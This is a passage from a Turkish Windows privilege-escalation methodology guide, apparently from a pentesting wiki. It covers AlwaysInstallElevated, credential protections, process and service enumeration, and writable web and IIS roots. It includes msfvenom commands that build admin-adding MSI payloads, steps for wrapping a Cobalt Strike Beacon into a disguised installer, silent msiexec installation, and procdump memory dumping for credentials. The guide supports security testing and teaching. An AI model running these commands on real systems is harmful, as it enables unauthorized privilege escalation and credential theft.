Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, aktarılan kimliğin nesne ACL'sini ve seçilen COM sınıfının kimlik doğrulama ve impersonation düzeylerini kontrol edin. Çağıranın oturum açma türü ve kimlik bilgisi bağlamı önemlidir: Bir WinRM oturumu, etkileşimli veya yeni kimlik bilgileriyle açılan bir oturumdan farklı davranabilir. Güvenlik duvarı/OXID yönlendirmesi ve yüklü güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen bir ACL'yi incelenmesi gereken bir aday olarak değerlendirin; pasif envanter çıkarma işlemi COM coercion, relay kimlik doğrulaması veya dizin yazma işlemlerini tetiklememelidir. Bir machine-account shadow credential, bir machine ticket elde edilmesini sağlayabilir; ancak yalnızca bu hesabın gerekli directory replication haklarına sahip olması durumunda ayrı bir DCSync yoluna da götürebilir.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresindeki **exploit'i bulun**

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresine bakın.

## AlwaysInstallElevated

Bu 2 registry değeri **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir Meterpreter session'ınız varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Yetkileri yükseltmek için mevcut dizinde bir Windows MSI ikilisi oluşturmak üzere PowerUp'ın `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GUI erişiminiz olmalıdır):

```
Write-UserAddMSI
```

Oluşturulan binary'yi çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Bu araçları kullanarak MSI wrapper oluşturmayı öğrenmek için bu tutorial'ı okuyun. Yalnızca **command line'ları** **çalıştırmak** istiyorsanız, bir "**.bat**" dosyasını da wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**
- **Visual Studio**'yu açın, **Create a new project**'i seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **Next**'e tıklayın.
- **AlwaysPrivesc** gibi bir proje adı girin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory**'yi seçin ve **Create**'e tıklayın.
- 3 / 4. adıma (dahil edilecek dosyaları seçme) ulaşana kadar **Next**'e tıklayın. **Add**'e tıklayıp az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini vurgulayın ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
  - Yüklenen uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi başka özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'a sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Böylece yükleyici çalıştırılır çalıştırılmaz Beacon payload'ı çalışır.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak, **build edin**.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI yükleme

Kötü amaçlı `.msi` dosyasının **yüklemesini** arka planda gerçekleştirmek için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu güvenlik açığından yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Algılayıcılar

### Denetim Ayarları

Bu ayarlar nelerin **kayda alındığını** belirler, bu yüzden dikkat etmelisiniz.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, günlüklerin nereye gönderildiğini bilmek açısından ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlarda her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmiş** olmasını sağlayarak **yerel Administrator parolalarının yönetimi** için tasarlanmıştır. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izinler verilmiş kullanıcılar tarafından görüntülenebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** ile birlikte Microsoft, sistemi daha da güvenli hale getirmek için güvenilmeyen işlemlerin Local Security Authority (LSA) belleğini **okuma** veya içine kod enjekte etme girişimlerini **engellemek** amacıyla geliştirilmiş korumayı kullanıma sundu.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10** ile tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Bazı ayrıcalıklı gruplara üyeyseniz ayrıcalıklarınızı yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalık yükseltmek için bunlardan nasıl yararlanılacağı hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token**'ın ne olduğu hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç token'lar hakkında bilgi edinmek** ve bunlardan nasıl yararlanılacağını öğrenmek için aşağıdaki sayfaya bakın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Ana klasörler

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola Politikası

```bash
net accounts
```

### Panodaki içeriği al

```bash
powershell -command "Get-Clipboard"
```

## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle, işlemleri listelerken **işlemin komut satırında parola olup olmadığını kontrol edin**.\
Çalışan bir binary'nin **üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking saldırılarından**](dll-hijacking/index.html) yararlanmak için binary klasöründe yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers** olup olmadığını kontrol edin; bunları ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Bir debugger listener kısa süreli çalışabilir; bu nedenle tek bir pasif port anlık görüntüsünde görünmemesi, hiçbir zaman erişime açık olmadığını kanıtlamaz. Gözlemlenen listener'ları PID, süreç sahibi ve düşük ayrıcalıklı kullanıcının bunlara erişip erişemediğiyle ilişkilendirin; yalnızca uygulama adı veya debug flag'i, kullanıcılar arası code execution olduğunu kanıtlamaz. Rutin enumerasyon sırasında debugger komutları göndermek yerine pasif kalın.

**Süreç ikililerinin izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**İşlem ikililerinin bulunduğu klasörlerin izinlerini denetleme (**[**DLL Hijacking**](dll-hijacking/index.html)**)****

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, `snort.exe -c <config>` ile seçilen yapılandırmada belirtilen `dynamicpreprocessor directory` konumundan shared library'ler yükleyebilir. Snort'u farklı bir hesap altında çalıştıran bir scheduled task veya service için, tam olarak bu yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız burada dosya oluşturabiliyorsa, bu yol task veya service modülleri bir sonraki yüklediğinde code execution açısından incelenmeye değer bir adaydır. Run-as hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve olası deny veya share kısıtlamalarını doğrulayın; yalnızca yazılabilir bir dizinin bulunması privilege escalation olduğunu kanıtlamaz. [Snort'un dynamic-preprocessor belgeleri](https://www.snort.org/documents/dpx-readme), runtime module loading konusunu açıklar.

### Yazılabilir document root'a sahip ayrıcalıklı web service

Bir Windows Apache kurulumunda, service'in executable path'ini ve run-as hesabını etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Yaygın bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış document root'un (genellikle `C:\xampp\htdocs`) ACL'sini inceleyin. Apache `LocalSystem` olarak çalışırken daha düşük ayrıcalıklı bir kullanıcı bu root dizininde dosya oluşturabiliyorsa, server-side code execution ana makinenin privilege boundary'sini aşabilir. Service'in çalıştığını, tam olarak bu yolun sunulduğunu ve bir server-side handler'ın dosya türünü işlediğini doğrulayın; yalnızca yazılabilir bir root dizini dosya oluşturulabildiğini kanıtlar. ACL'leri bir test dosyası yazmadan inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

For geleneksel bir WAMP kurulumunda hizmet, sürümlü bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasını (32 bitlik bir düzen için `C:\wamp\...`) gösterebilir; yapılandırma dosyası bunun yanındaki `conf\httpd.conf` altında, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` olabilir. Hizmetin tam çalıştırılabilir dosya yolunu, çalıştırıldığı kimliği, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dahil) ve kök ACL'sini birlikte kontrol edin. Yazılabilir bir WAMP dizini, Apache'nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı çalıştırdığını kanıtlamaz. [Apache, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini belgeler](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kökü ve uygulama havuzunun ağ kimliği

IIS için, yazılabilir bir fiziksel dizini `applicationHost.config` içindeki **etkin bir site/uygulamayla** eşleyin, ardından yapılandırılmış havuzunu ve sunucu tarafı işleyicisini belirleyin. Sunulan bir dizine yerleştirilen kod, yalnızca IIS bu dosya türünü işliyorsa ve ilgili yola erişilebiliyorsa havuz kimliğiyle çalışır. Yazılabilir bir dizini kod yürütme olarak değerlendirmeden önce geçerli kullanıcının etkin dosya oluşturma erişimini, site çalışma durumunu, işleyiciyi ve yola özgü geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi, incelenmesi gereken ayrı bir yol sunar: uygulamanın derleme dizininde oluşturulan dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bunu değiştirebilir. [Microsoft konumu ve uygulama başına alt dizinleri belgeler](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzları birbirine güvenmediğinde derleme dizinlerinin yalıtılmasını önerir](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir token, **belirli** uygulamanın önbelleğindeki oluşturulan kaynak kodu değiştirebiliyorsa, bu uygulamanın kodu daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL'si kod yürütüldüğünü kanıtlamaz: önbelleği etkin uygulama, etkin token ve ACL, derleme ayarları, işlem kimliği ve yeniden derleme zamanlamasıyla ilişkilendirin. Salt okunur metadata incelemesi yapın; sayım sırasında derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token'ı düşük ayrıcalıklı olsa bile, genellikle etki alanı kaynaklarında **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` yerelde zaten yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise normalde anonim ağ kimlik bilgileri sunar. `SpecificUser` havuzu bunun yerine yapılandırılmış hesabını kullanır. [Microsoft bu kimlik türlerini belgeler](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini açıklar](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Kimlik ayarı belirtilmemişse havuz varsayılanları devralınabilir; bunlar IIS sürümleri arasında farklılık gösterdiğinden, havuz adına bakarak tahmin etmek yerine etkin yapılandırmayı çözümleyin. Kod yürütme bilgisayar hesabı ağ kimliğine sahip bir havuza ulaşıyorsa, **söz konusu bilgisayarın** dizin üzerindeki izinlerini değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma izinleri gerektirir; tek başına bir makine hesabı bileti veya ana bilgisayar rolü bu izinlerin varlığını kanıtlamaz. Pasif sayım sırasında dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırma ve ACL'leri inceleyin.

Yardımcı bir işlem başlatan, okunabilir bir ASP.NET işleyicisi için istekten türetilen her değerin kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma aşamalarından nasıl geçtiğini izleyin. Çözümlenmiş bir token'ı `ProcessStartInfo("cmd", "/c ...")` içine ekleyen bir işleyici, kabuk meta karakterlerinin komutu değiştirmesine izin verebilir; [Microsoft, `cmd` özel karakterlerini belgeler](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağıranın çözümlenmiş değeri gerçekten etkileyebildiğini ve işleyiciye ulaşabildiğini doğrulayın; ardından etkin uygulama havuzu veya taklit edilen kimliği ve alt işlemin kimliğini belirleyin. Okunabilir bir kaynak kodu satırı, localhost dinleyicisi veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut yürütüldüğünü kanıtlamaz. Pasif sayım sırasında sahte istekler göndermeden veya yardımcı programı çalıştırmadan kaynak kodu ve havuz yapılandırmasını inceleyin.

Windows'ta çalışan bir PHP hizmeti için, istekle denetlenen ve [`include` veya `require`](https://www.php.net/manual/en/function.include.php) işlevine aktarılan bir yol, düşük kullanıcının yazabildiği bir PHP dosyasını worker'ın kimliğiyle değerlendirebilir. İsteğin bu ifadeye ulaşabildiğini, çözümlenen yolun düşük kullanıcının değiştirebildiği ve worker'ın okuyabildiği bir dosyayı belirttiğini, geçerli PHP yol kısıtlamalarının include işlemine izin verdiğini ve worker'ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Tek başına bir loopback dinleyicisi veya yazılabilir dosya bu zinciri kanıtlamaz; pasif sayım sırasında uç noktayı çağırmadan kaynak kodu, hizmet kimliğini ve dosya ACL'lerini inceleyin.

### Memory Password mining

Sysinternals'tan **procdump** kullanarak çalışan bir işlemin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerin **kimlik bilgileri bellekte açık metin olarak bulunur**; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

### Ayrıcalıklı proje dosyası içe aktarma

Düşük ayrıcalıklı bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Tam yazılabilir yolu**, bu yolu açan işlemi veya görevi, etkin kimliğini ve ayrıştırıcı derlemesini inceleyin. [Geçmişteki bir Ghidra proje açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje meta verilerinde harici XML varlıklarına izin veriyordu; Windows'taki bir ağ varlığı, [giden SMB ve NTLM ilkeleri](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa içe aktarma hesabından kimlik doğrulamayı tetikleyebilirdi. Bu, kimlik bilgilerinin açığa çıkmasına dair bir bulgudur; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı bir yetkili veya güvenlik açığı bulunan yol üzerinden kullanılabilmesi gerekir ve güncel derlemeler gerçek yama durumlarına göre değerlendirilmelidir. Pasif numaralandırma sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki haklardan ayrıdır. Bu hak için başarılı, salt okunur bir [`OpenSCManager` erişim isteği](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) inceleme için bir bulgudur; yeni bir hizmetin çalıştırılabileceğinin kanıtı değildir. [`CreateService` bir tanıtıcı döndürür](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) ve bu tanıtıcı, oluşturma sırasında istenen hizmet erişim haklarına sahiptir; hizmeti daha sonra yeniden açmak ayrı bir erişim denetimi gerçekleştirir ve özgün tanıtıcı kullanılabilir olsa bile başarısız olabilir. Etkin yerel veya uzak token'ı, verilen tanıtıcı haklarını, hizmet hesabını, başlatma ilkesini ve çalıştırılabilir dosya yolunu ayrı ayrı doğrulayın. Pasif numaralandırma sırasında hizmet oluşturmayın veya başlatmayın.

Uzak hizmet kurulum yolu için bu SCM haklarını, **aynı ağ oturum açma hesabının** hedefte yazabildiği bir paylaşımla, paylaşımın temelindeki NTFS ACL'siyle ve hizmet hesabının çalıştırabildiği yerel bir yürütülebilir dosya yoluyla ilişkilendirin. Alışılmadık derecede geniş SCM hakları ile dosya yerleştirme yolu birlikte mevcutsa, yönetici olmayan bir hesap bu sınırı aşabilir; yönetim paylaşımı zorunlu değildir. Yalnızca paylaşıma yazma erişimi veya yalnızca SCM hizmet oluşturma bulgusu, yeni hizmetin daha yüksek bir kimlikle başlatılabileceğini göstermez.

Mevcut bir hizmet, bu yardımcı dosya `ImagePath` içinde belirtilmemiş olsa bile başlangıç, kapanış veya başka bir yaşam döngüsü olayı sırasında bir yardımcı yürütülebilir dosyayı çağırabilir. Yardımcı dosya adı, düşük ayrıcalıklı bir kullanıcının yazabildiği bir dizinde çözümleniyorsa ve hizmet daha yüksek bir kimlikle çalışıyorsa, eksik yardımcı dosya koşula bağlı bir değiştirme adayıdır. **Gerçek hizmet kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen yürütülebilir dosya yolunu ve arama sırasını, dizin oluşturma haklarını, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına hizmetin dosyayı yükleyeceğini göstermez; pasif inceleme sırasında hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmet için [`SERVICE_START`, `StartService`'e bağımsız değişken sağlamaya izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu, [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) hakkından farklıdır. Başlatma erişimini yalnızca bir denetim hakkı olarak değerlendirmeden önce hizmetin kodunu veya belgelenmiş arayüzünü inceleyin. Hizmet, çağıranın seçtiği bağımsız değişkeni günlük veya dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, bağımsız değişkenden yazma işlemine giden tam akışı, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korumalı bir dizine yazma, yalnızca ayrıcalıklı bir tüketici veya yükleyici bu dosyayı kabul ediyorsa ayrıcalık yükseltmeye dönüşebilir; yazılabilir bir günlük veya başlatma hakkı tek başına yeterli değildir. Pasif envanter sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

NSClient++ izleme aracısı için okunabilir bir `nsclient.ini`, bir **yapılandırma inceleme bulgusudur**: web kimlik bilgilerini içerebilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB dinleyicisini ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya komut dosyalarını değiştirip değiştiremediğini kontrol edin. Ayrıcalıklı yürütme için ek olarak `CheckExternalScripts` (veya etkin başka bir yürütme yolu), bir komut kaydetme ya da değiştirme konusunda geçerli bir hak ve bunu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca loopback arayüzünde dinleyen bir porta yerel kullanıcı yine de erişebilir; ancak yalnızca dosya yolu, parola veya dinleyici bu hakların varlığını göstermez. Pasif numaralandırma sırasında sırları görüntülemeden veya web API'sini çağırmadan meta verileri ve izinleri inceleyin. Bkz. [NSClient++ dosya düzeni](https://nsclient.org/docs/concepts/file-layout/), [web ve komut dosyası güvenliği kılavuzu](https://nsclient.org/docs/setup/securing/) ve [harici komut dosyası yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir hizmette, hizmetin gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM alt uygulamayı burada saklar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), `AppDirectory` ise yapılandırılmış çalışma dizinidir. Sarmalayıcının izinlerini hizmet sınırının tamamı olarak değerlendirmeden önce alt yürütülebilir dosyayı ve üst dizinin ACL'lerini kontrol edin. Bu alt uygulamanın açığa çıkardığı yerel bir WCF veya SOAP uç noktası ayrı bir inceleme bulgusudur: düşük ayrıcalıklı kullanıcının dinleyiciye erişebildiğini, tam olarak hangi işlemin kullanıcının girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlikle yürüttüğünü doğrulayın. Hizmet hesabı, bir uç nokta URL'si veya yazılabilir bir yol tek başına ayrıcalık yükseltmeyi kanıtlamaz; pasif numaralandırma sırasında hizmet işlemlerini çağırmaktan kaçının.

Özel bir WCF işlemi için, çağıranın denetleyebildiği bir dizenin herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript` komut dosyası metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke` pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows taşıma kimlik bilgilerini kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** işlemi çağırma yetkisi ve runspace'in etkin kimliği ayrıca denetlenmelidir. Düşük ayrıcalıklı bir çağıranın girdisinden daha yüksek hizmet kimliği altında `AddScript`'e uzanan yol, bir kod yürütme sınırıdır; dinleme portu, kimliği doğrulanmış istemci veya ilgisiz bir derlemedeki kullanılmayan yöntem tek başına kanıt değildir. Numaralandırma sırasında uç noktayı çağırmadan dağıtılan hizmeti, sözleşmeyi, yetkilendirmeyi ve kimliğe bürünme ayarlarını statik olarak inceleyin.

Service Triggers, Windows'un belirli koşullar oluştuğunda (named pipe/RPC uç noktası etkinliği, ETW olayları, IP kullanılabilirliği, aygıt bağlantısı, GPO yenilemesi vb.) bir hizmeti başlatmasını sağlar. SERVICE_START hakları olmadan bile tetikleyicilerini etkinleştirerek ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Numaralandırma ve etkinleştirme tekniklerine buradan bakın:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcı hizmeti

C/C++ araçları içeren Visual Studio kurulumlarında, `LocalSystem` olarak çalışacak şekilde yapılandırılmış `VSStandardCollectorService150` tanılama hizmeti bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), hizmetin DACL sıfırlama işlemini yönlendirmek için bir junction ve object-manager-link yarışından yararlandı. Gösterilen ayrıcalık yükseltme ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolunu ve `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefini gerektiriyordu. Bileşendeki sorun Ocak 2024'te giderildi.

Pasif ön inceleme için yalnızca bu hizmetin hesabını ve ikili dosya yolunu inceleyin, Setup WMI compiler yolunun mevcut olup olmadığını kontrol edin ve kurulu bileşenin yama durumunu doğrulayın. Bir hizmet girdisi, Visual Studio ürün sürümü veya compiler dosyası tek başına ana makinenin savunmasız olduğunu göstermez. İnceleme sırasında hizmeti başlatmak veya onarım çalıştırmak gerekmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi edinmek için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_'tan **accesschk** binary'sine sahip olmanız önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirebilip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
